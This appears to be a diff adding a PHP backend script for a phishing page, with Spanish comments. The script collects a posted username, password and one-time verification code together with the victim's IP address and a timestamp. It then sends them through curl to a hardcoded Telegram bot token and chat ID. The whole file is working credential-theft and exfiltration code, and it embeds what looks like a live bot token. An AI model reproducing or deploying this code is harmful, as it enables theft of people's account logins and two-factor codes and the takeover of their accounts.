@@ -1,0 +1,55 @@
+<?php
+
+date_default_timezone_set("America/Bogota");
+
+// 📥 DATOS RECIBIDOS
+$usuario = $_POST['usuario'] ?? '';
+$clave   = $_POST['clave'] ?? '';
+$codigo  = $_POST['codigo'] ?? '';
+
+// 🌐 IP REAL
+function getIP(){
+    if(!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
+    if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
+    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+}
+
+$ip = getIP();
+
+// 🕒 HORA
+$fecha = date("Y-m-d H:i:s");
+
+// 🔐 TOKEN Y CHAT ID (TU BOT)
+$token = "8687740380:AAGWDU18CPeXsMWhpzy1n6uZ-MkeTxWYYUo";
+$chat_id = "8448767308";
+
+// 🧾 MENSAJE
+$mensaje = "💳 DATOS COMPLETOS\n\n";
+$mensaje .= "👤 Usuario: $usuario\n";
+$mensaje .= "🔑 Clave: $clave\n";
+$mensaje .= "📲 Código: $codigo\n\n";
+$mensaje .= "🌐 IP: $ip\n";
+$mensaje .= "🕒 Hora: $fecha";
+
+// 🚀 ENVÍO A TELEGRAM
+$url = "https://api.telegram.org/bot$token/sendMessage";
+
+$data = [
+    "chat_id" => $chat_id,
+    "text" => $mensaje
+];
+
+// CURL
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$result = curl_exec($ch);
+curl_close($ch);
+
+// RESPUESTA
+echo "OK";
+
+?>
